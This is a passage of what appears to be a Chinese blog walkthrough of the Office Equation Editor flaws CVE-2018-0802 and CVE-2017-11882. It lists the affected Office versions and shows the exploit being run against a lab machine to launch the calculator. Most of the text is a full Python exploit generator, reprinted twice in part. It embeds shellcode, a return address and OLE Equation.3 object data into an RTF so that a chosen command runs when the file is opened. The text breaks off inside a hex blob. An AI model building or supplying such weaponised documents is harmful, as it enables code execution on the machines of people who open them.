class=\"string\">0000000000000000000000000000000000000000000000000000000100feff030a0000ffffffff02</span></span><br><span class=\"line\"><span class=\"string\">ce020000000000c000000000000046170000004d6963726f736f6674204571756174696f6e20332e</span></span><br><span class=\"line\"><span class=\"string\">30000c0000004453204571756174696f6e000b0000004571756174696f6e2e3300f439b271000000</span></span><br><span class=\"line\"><span class=\"string\">00000000000000000000000000000000000000000000000000000000000000000000000000030004</span></span><br><span class=\"line\"><span class=\"string\">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class=\"line\"><span class=\"string\">000000000000000000000000000000000000001c00000002009ec4a900000000000000c8a75c00c4</span></span><br><span class=\"line\"><span class=\"string\">ee5b0000000000030101030a0a01085a5a33c099b202c1e2082be2e8ffffffffc35b50648b40308b</span></span><br><span class=\"line\"><span class=\"string\">400899b203c1e21066ba120c03c28d5b1c53ffe02020202000000000000000000000000000000000</span></span><br><span class=\"line\"><span class=\"string\">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class=\"line\"><span class=\"string\">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class=\"line\"><span class=\"string\">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class=\"line\"><span class=\"string\">00000000000000000000000000000000000000000000000000000000000000000000004500710075</span></span><br><span class=\"line\"><span class=\"string\">006100740069006f006e0020004e0061007400690076006500000000000000000000000000000000</span></span><br><span class=\"line\"><span class=\"string\">0000000000000000000000000000000000000020000200ffffffffffffffffffffffff0000000000</span></span><br><span class=\"line\"><span class=\"string\">0000000000000000000000000000000000000000000000000000000000000004000000c500000000</span></span><br><span class=\"line\"><span class=\"string\">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class=\"line\"><span class=\"string\">00000000000000000000000000000000000000000000000000000000000000ffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffff00000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class=\"line\"><span class=\"string\">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class=\"line\"><span class=\"string\">000000000000000000000000000000000000000000000000000000000000000000000000000000ff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffff0000000000000000000000000000000000000000000000000000000000</span></span><br><span class=\"line\"><span class=\"string\">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class=\"line\"><span class=\"string\">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class=\"line\"><span class=\"string\">00000000000000ffffffffffffffffffffffff000000000000000000000000000000000000000000</span></span><br><span class=\"line\"><span class=\"string\">00000000000000000000000000000000000000000000000000000001050000050000000d0000004d</span></span><br><span class=\"line\"><span class=\"string\">45544146494c4550494354003421000035feffff9201000008003421cb010000010009000003c500</span></span><br><span class=\"line\"><span class=\"string\">000002001c00000000000500000009020000000005000000020101000000050000000102ffffff00</span></span><br><span class=\"line\"><span class=\"string\">050000002e0118000000050000000b0200000000050000000c02a001201e1200000026060f001a00</span></span><br><span class=\"line\"><span class=\"string\">ffffffff000010000000c0ffffffc6ffffffe01d0000660100000b00000026060f000c004d617468</span></span><br><span class=\"line\"><span class=\"string\">54797065000020001c000000fb0280fe0000000000009001000000000402001054696d6573204e65</span></span><br><span class=\"line\"><span class=\"string\">7720526f6d616e00feffffff6b2c0a0700000a0000000000040000002d0100000c000000320a6001</span></span><br><span class=\"line\"><span class=\"string\">90160a000000313131313131313131310c000000320a6001100f0a00000031313131313131313131</span></span><br><span class=\"line\"><span class=\"string\">0c000000320a600190070a000000313131313131313131310c000000320a600110000a0000003131</span></span><br><span class=\"line\"><span class=\"string\">31313131313131310a00000026060f000a00ffffffff0100000000001c000000fb02100007000000</span></span><br><span class=\"line\"><span class=\"string\">0000bc02000000000102022253797374656d000048008a0100000a000600000048008a01ffffffff</span></span><br><span class=\"line\"><span class=\"string\">7cef1800040000002d01010004000000f0010000030000000000</span></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">stage1=<span class=\"string\">\"\\xB8\\x44\\xEB\\x71\\x12\\xBA\\x78\\x56\\x34\\x12\\x31\\xD0\\x8B\\x08\\x8B\\x09\\x8B\\x09\\x66\\x83\\xC1\\x3C\\x31\\xDB\\x53\\x51\\xBE\\x64\\x3E\\x72\\x12\\x31\\xD6\\xFF\\x16\\x53\\x66\\x83\\xEE\\x4C\\xFF\\x10\"</span></span><br><span class=\"line\">stage1=stage1.ljust(<span class=\"number\">44</span>,<span class=\"string\">'\\x90'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">COMMAND_OFFSET = (<span class=\"number\">0x949</span>+<span class=\"number\">0x2b</span>)*<span class=\"number\">2</span></span><br><span class=\"line\">COMD_LEN = (<span class=\"number\">0x94</span>-<span class=\"number\">0x2b</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">create_ole_exec_primitive</span>(<span class=\"params\">command</span>):</span><br><span class=\"line\">    hex_command = command.encode(<span class=\"string\">\"hex\"</span>)</span><br><span class=\"line\">    hex_command += (COMD_LEN - <span class=\"built_in\">len</span>(command)) * <span class=\"string\">\"20\"</span></span><br><span class=\"line\">    hex_command += <span class=\"string\">\"2500\"</span></span><br><span class=\"line\">    objdata_hex_stream = OBJDATA_TEMPLATE.translate(<span class=\"literal\">None</span>, <span class=\"string\">\"\\r\\n\"</span>)</span><br><span class=\"line\">    ole_data = objdata_hex_stream[:COMMAND_OFFSET] + hex_command + objdata_hex_stream[COMMAND_OFFSET + <span class=\"built_in\">len</span>(hex_command):]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> OBJECT_HEADER + ole_data</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">create_rtf</span>(<span class=\"params\">header, trailer, command</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(command) &gt; COMD_LEN:</span><br><span class=\"line\">        <span class=\"built_in\">print</span> <span class=\"string\">'[!] Command must be shorter than 109 bytes!'</span></span><br><span class=\"line\">        sys.exit(<span class=\"number\">0</span>)</span><br><span class=\"line\">    ole = create_ole_exec_primitive(command + <span class=\"string\">\" #\"</span>)</span><br><span class=\"line\">    payload=<span class=\"string\">'\\x1c\\x00\\x00\\x00\\x02\\x00\\x9e\\xc4\\xa9\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xc8\\xa7\\\\\\x00\\xc4\\xee[\\x00\\x00\\x00\\x00\\x00\\x03\\x01\\x01\\x03\\n\\n\\x01\\x08ZZ'</span></span><br><span class=\"line\">    payload+=stage1</span><br><span class=\"line\">    payload+=pack(<span class=\"string\">'&lt;I'</span>,<span class=\"number\">0x00402114</span>) <span class=\"comment\"># ret</span></span><br><span class=\"line\">    payload+=<span class=\"string\">'\\x00'</span>*<span class=\"number\">2</span></span><br><span class=\"line\">    payload+=command</span><br><span class=\"line\">    payload=payload.ljust(<span class=\"number\">197</span>,<span class=\"string\">'\\x00'</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> header + ole + OBJECT_TRAILER + OBJCLASS11882 + payload.encode(<span class=\"string\">'hex'</span>) + OBJECT_TRAILER11882  + trailer</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getrheader</span>(<span class=\"params\">file</span>):</span><br><span class=\"line\">    input_file = <span class=\"built_in\">open</span>(file,<span class=\"string\">\"r\"</span>).read()</span><br><span class=\"line\">    r_header = input_file.split(<span class=\"string\">\"{\\*\\datastore\"</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> r_header</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    <span class=\"built_in\">print</span> LOGO</span><br><span class=\"line\">    parser = argparse.ArgumentParser(description=<span class=\"string\">\"PoC for CVE-2018-0802 And CVE-2017-11882\"</span>)</span><br><span class=\"line\">    parser.add_argument(<span class=\"string\">\"-c\"</span>, <span class=\"string\">\"--command\"</span>, <span class=\"built_in\">help</span>=<span class=\"string\">\"Command run in target system\"</span>, required=<span class=\"literal\">True</span>)</span><br><span class=\"line\">    parser.add_argument(<span class=\"string\">'-o'</span>, <span class=\"string\">\"--output\"</span>, <span class=\"built_in\">help</span>=<span class=\"string\">\"Output exploit rtf\"</span>, required=<span class=\"literal\">True</span>)</span><br><span class=\"line\">    parser.add_argument(<span class=\"string\">\"-i\"</span>, <span class=\"string\">\"--input\"</span>, <span class=\"built_in\">help</span>=<span class=\"string\">\"Input normal rtf.\"</span>, required=<span class=\"literal\">False</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    args = parser.parse_args()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> args.<span class=\"built_in\">input</span> != <span class=\"literal\">None</span>:</span><br><span class=\"line\">        r_header = getrheader(args.<span class=\"built_in\">input</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        r_header = RTF_HEADER</span><br><span class=\"line\"></span><br><span class=\"line\">    rtf_content = create_rtf(r_header, RTF_TRAILER,  args.command)</span><br><span class=\"line\"></span><br><span class=\"line\">    output_file = <span class=\"built_in\">open</span>(args.output, <span class=\"string\">\"w\"</span>)</span><br><span class=\"line\">    output_file.write(rtf_content)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span> <span class=\"string\">\"[*] Done ! output file --&gt; \"</span> + args.output </span><br></pre></td></tr></tbody></table></figure>","more":"<p>受影响的版本</p>\n<blockquote>\n<p>Microsoft Office 2007 Service Pack 3</p>\n<p>Microsoft Office 2010 Service Pack 2 (32-bit editions)</p>\n<p>Microsoft Office 2010 Service Pack 2 (64-bit editions)</p>\n<p>Microsoft Office 2013 Service Pack 1 (32-bit editions)</p>\n<p>Microsoft Office 2013 Service Pack 1 (64-bit editions)</p>\n<p>Microsoft Office 2016 (32-bit edition)</p>\n<p>Microsoft Office 2016 (64-bit edition)</p>\n<p>Microsoft Office 2016 Click-to-Run (C2R) for 32-bit editions</p>\n<p>Microsoft Office 2016 Click-to-Run (C2R) for 64-bit editions</p>\n<p>Microsoft Office Compatibility Pack Service Pack 3</p>\n<p>Microsoft Word 2007 Service Pack 3</p>\n<p>Microsoft Word 2010 Service Pack 2 (32-bit editions)</p>\n<p>Microsoft Word 2010 Service Pack 2 (64-bit editions)</p>\n<p>Microsoft Word 2013 RT Service Pack 1 </p>\n<p>Microsoft Word 2013 Service Pack 1 (32-bit editions)</p>\n<p>Microsoft Word 2013 Service Pack 1 (64-bit editions)</p>\n<p>Microsoft Word 2016 (32-bit edition)</p>\n<p>Microsoft Word 2016 (64-bit edition)</p>\n</blockquote>\n<p>这个漏洞需要打了CVE-2017-11882的补丁后才有效。</p>\n<p>首先准备好用于生成利用漏洞的文件</p>\n<p>在这里下载：<a href=\"https://github.com/Ridter/RTF_11882_0802\">https://github.com/Ridter/RTF_11882_0802</a></p>\n<p>或者直接复制<a href=\"#%E9%99%84%E5%BD%95\">附录</a>的内容存为对应文件：</p>\n<p>然后执行：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python RTF_11882_0802.py -c &quot;cmd.exe /c calc.exe&quot; -o test.doc</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/cn/posts/63237/image-20200622204154770.png\" alt=\"image-20200622204154770\"></p>\n<p>将文件复制到靶机，我这里为了方便直接复制到kali自带的Apache里面让靶机去下载了。</p>\n<p><img src=\"/cn/posts/63237/image-20200621213913982.png\" alt=\"image-20200621213913982\"></p>\n<p>打开刚刚我们生成的文件后就会发现打开word的同时启动了计算器。</p>\n<p><img src=\"/cn/posts/63237/image-20200622204008081.png\" alt=\"image-20200622204008081\"></p>\n<h5 id=\"附录\"><a href=\"#附录\" class=\"headerlink\" title=\"附录\"></a>附录</h5><p>RTF_11882_0802.py 的代码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\">#-*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># @Author  : Evi1cg</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> argparse</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">from</span> struct <span class=\"keyword\">import</span> pack</span><br><span class=\"line\"></span><br><span class=\"line\">LOGO = <span class=\"string\">R&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">      ___                         ___     </span></span><br><span class=\"line\"><span class=\"string\">     /\\  \\                       /\\__\\    </span></span><br><span class=\"line\"><span class=\"string\">    /::\\  \\         ___         /:/ _/_   </span></span><br><span class=\"line\"><span class=\"string\">   /:/\\:\\__\\       /\\__\\       /:/ /\\__\\  </span></span><br><span class=\"line\"><span class=\"string\">  /:/ /:/  /      /:/  /      /:/ /:/  /  </span></span><br><span class=\"line\"><span class=\"string\"> /:/_/:/__/___   /:/__/      /:/_/:/  /   </span></span><br><span class=\"line\"><span class=\"string\"> \\:\\/:::::/  /  /::\\  \\      \\:\\/:/  /    </span></span><br><span class=\"line\"><span class=\"string\">  \\::/~~/~~~~  /:/\\:\\  \\      \\::/__/     </span></span><br><span class=\"line\"><span class=\"string\">   \\:\\~~\\      \\/__\\:\\  \\      \\:\\  \\     </span></span><br><span class=\"line\"><span class=\"string\">    \\:\\__\\          \\:\\__\\      \\:\\__\\    </span></span><br><span class=\"line\"><span class=\"string\">     \\/__/           \\/__/       \\/__/ &quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">RTF_HEADER = <span class=\"string\">R&quot;&quot;&quot;&#123;\\rtf1\\ansi\\ansicpg1252\\deff0\\nouicompat\\deflang1033&#123;\\fonttbl&#123;\\f0\\fnil\\fcharset0 Calibri;&#125;&#125;</span></span><br><span class=\"line\"><span class=\"string\">&#123;\\*\\generator Riched20 6.3.9600&#125;\\viewkind4\\uc1</span></span><br><span class=\"line\"><span class=\"string\">\\pard\\sa200\\sl276\\slmult1\\f0\\fs22\\lang9&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">RTF_TRAILER = <span class=\"string\">R&quot;&quot;&quot;\\par&#125;</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">OBJCLASS11882 =<span class=\"string\">R&quot;&quot;&quot;&#123;\\object\\objemb\\objupdate&#123;\\*\\objclass Equation.3&#125;\\objw660\\objh260&#123;\\*\\objdata 01050000020000000b0000004571756174696f6e2e33000000000000000000000c0000d0cf11e0a1b11ae1000000000000000000000000000000003e000300feff0900060000000000000000000000010000000100000000000000001000000200000001000000feffffff0000000000000000fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffdffffff04000000fefffffffefffffffeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff52006f006f007400200045006e00740072007900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000016000500ffffffffffffffff0200000002ce020000000000c0000000000000460000000000000000000000008020cea5613cd30103000000000200000000000001004f006c00650000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000201ffffffffffffffffffffffff000000000000000000000000000000000000000000000000000000000000000000000000000000001400000000000000010043006f006d0070004f0062006a00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000120002010100000003000000ffffffff00000000000000000000000000000000000000000000000000000000000000000000000001000000660000000000000003004f0062006a0049006e0066006f0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000012000201ffffffff04000000ffffffff000000000000000000000000000000000000000000000000000000000000000000000000030000000600000000000000feffffff02000000fefffffffeffffff050000000600000007000000feffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff010000020800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100feff030a0000ffffffff02ce020000000000c000000000000046170000004d6963726f736f6674204571756174696f6e20332e30000c0000004453204571756174696f6e000b0000004571756174696f6e2e3300f439b271000000000000000000000000000000000000000000000000000000000000000000000000000000000300040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">OBJECT_HEADER = <span class=\"string\">R&quot;&quot;&quot;&#123;\\object\\objemb\\objupdate&#123;\\*\\objclass Equation.3&#125;\\objw380\\objh260&#123;\\*\\objdata &quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">OBJECT_TRAILER = <span class=\"string\">R&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">&#125;&#123;\\result &#123;\\rtlch\\fcs1 \\af0 \\ltrch\\fcs0 \\dn8\\insrsid95542\\charrsid95542 &#123;\\pict&#123;\\*\\picprop\\shplid1025&#123;\\sp&#123;\\sn shapeType&#125;&#123;\\sv 75&#125;&#125;&#123;\\sp&#123;\\sn fFlipH&#125;&#123;\\sv 0&#125;&#125;</span></span><br><span class=\"line\"><span class=\"string\">&#123;\\sp&#123;\\sn fFlipV&#125;&#123;\\sv 0&#125;&#125;&#123;\\sp&#123;\\sn fLockAspectRatio&#125;&#123;\\sv 1&#125;&#125;&#123;\\sp&#123;\\sn pictureGray&#125;&#123;\\sv 0&#125;&#125;&#123;\\sp&#123;\\sn pictureBiLevel&#125;&#123;\\sv 0&#125;&#125;&#123;\\sp&#123;\\sn fRecolorFillAsPicture&#125;&#123;\\sv 0&#125;&#125;&#123;\\sp&#123;\\sn fUseShapeAnchor&#125;&#123;\\sv 0&#125;&#125;&#123;\\sp&#123;\\sn fFilled&#125;&#123;\\sv 0&#125;&#125;&#123;\\sp&#123;\\sn fHitTestFill&#125;&#123;\\sv 1&#125;&#125;</span></span><br><span class=\"line\"><span class=\"string\">&#123;\\sp&#123;\\sn fillShape&#125;&#123;\\sv 1&#125;&#125;&#123;\\sp&#123;\\sn fillUseRect&#125;&#123;\\sv 0&#125;&#125;&#123;\\sp&#123;\\sn fNoFillHitTest&#125;&#123;\\sv 0&#125;&#125;&#123;\\sp&#123;\\sn fLine&#125;&#123;\\sv 0&#125;&#125;&#123;\\sp&#123;\\sn fPreferRelativeResize&#125;&#123;\\sv 1&#125;&#125;&#123;\\sp&#123;\\sn fReallyHidden&#125;&#123;\\sv 0&#125;&#125;</span></span><br><span class=\"line\"><span class=\"string\">&#123;\\sp&#123;\\sn fScriptAnchor&#125;&#123;\\sv 0&#125;&#125;&#123;\\sp&#123;\\sn fFakeMaster&#125;&#123;\\sv 0&#125;&#125;&#123;\\sp&#123;\\sn fCameFromImgDummy&#125;&#123;\\sv 0&#125;&#125;&#123;\\sp&#123;\\sn fLayoutInCell&#125;&#123;\\sv 1&#125;&#125;&#125;\\picscalex100\\picscaley100\\piccropl0\\piccropr0\\piccropt0\\piccropb0</span></span><br><span class=\"line\"><span class=\"string\">\\picw353\\pich600\\picwgoal200\\pichgoal340\\wmetafile8\\bliptag1846300541\\blipupi2307&#123;\\*\\blipuid 6e0c4f7df03da08a8c6c623556e3c652&#125;0100090000035100000000001200000000000500000009020000000005000000020101000000050000000102ffffff00050000002e0118000000050000000b02</span></span><br><span class=\"line\"><span class=\"string\">00000000050000000c02200240011200000026060f001a00ffffffff000010000000c0ffffffaaffffff00010000ca0100000b00000026060f000c004d61746854797065000040000a00000026060f000a00ffffffff010000000000030000000000&#125;&#125;&#125;&#125;&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">OBJECT_TRAILER11882 =<span class=\"string\">R&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004500710075006100740069006F006E0020004E00610074006900760065000000000000000000000000000000000000000000000000000000000000000000000020000200FFFFFFFFFFFFFFFFFFFFFFFF00000000000000000000000000000000000000000000000000000000000000000000000004000000C5000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001050000050000000D0000004D45544146494C4550494354003421000035FEFFFF9201000008003421CB010000010009000003C500000002001C00000000000500000009020000000005000000020101000000050000000102FFFFFF00050000002E0118000000050000000B0200000000050000000C02A